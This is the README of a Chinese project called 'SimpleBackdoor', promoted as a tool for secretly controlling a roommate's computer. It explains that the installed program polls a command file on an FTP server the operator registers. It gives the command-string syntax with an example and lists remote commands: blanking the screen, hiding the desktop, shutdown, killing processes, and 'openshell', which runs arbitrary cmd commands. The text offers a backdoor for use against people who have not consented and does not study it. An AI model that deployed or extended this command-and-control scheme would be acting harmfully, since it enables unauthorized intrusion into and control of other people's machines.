SimpleBackdoor
==============

用于操控舍友电脑的神器

请自己注册自己的FTP，然后按照格式编写命令字符串

看源码吧，你懂的

结构介绍
==============
frmAuth是没用的。。可以忽略
本程序在特定时间间隔内会访问FTP服务器上的一个装载有指令的文件
然后提取指令，分离里面的数据
最终执行相应的指令

关于FTP
==============
自己找吧

命令结构
==============
示例：
isLiPaiRemoteServerFile#incremental@0.019#target@ALL#cmdName@volumeinc#cmdReference@fucku^30#sdkVersion@0%%END

其中，isLiPaiRemoteServerFile为前导，检测文件中包含该字符串才能继续
incremental@0.019：该参数指明执行的命令版本，每一次分发将数字调大才能被执行
target@ALL：该参数用于指定命令执行的终端，ALL表示所有终端，该参数取决于你安装本程序时开始设定的target值
cmdName@volumeinc：表示命令的名称
cmdReference@fucku^30：表示该命令附带的参数，参数中不能包含@和#符号

支持的命令
==============
cmdName			cmdReference
----音量相关----
volumedec		音量减少  参数为数字，表示减少的百分比
volumeinc		音量增加  参数为数字，表示增加的百分比
volumemute	静音，无参数附带，也可以附带任意数
----屏幕类----
blackscreen		黑屏一段时间，参数格式为：屏幕显示的文字^黑屏时长
closedesktop	关闭桌面，无参数
opendesktop		打开桌面，无参数
openshell		  执行命令，参数为cmd命令
----电源类-----
shutdown		关机，参数为延迟秒数（当前版本无延迟功能）
logoff			注销，参数为延迟秒数（当前版本无延迟功能）
restart			重启，参数为延迟秒数（当前版本无延迟功能）
----程序类--------
reset			重置，暂不设置该功能
killprocess		杀死进程，参数为进程名
cleanstatus		清除状态，暂不设置该功能
----语音类-----
speak			语言，参数为文字信息，暂不设置该功能
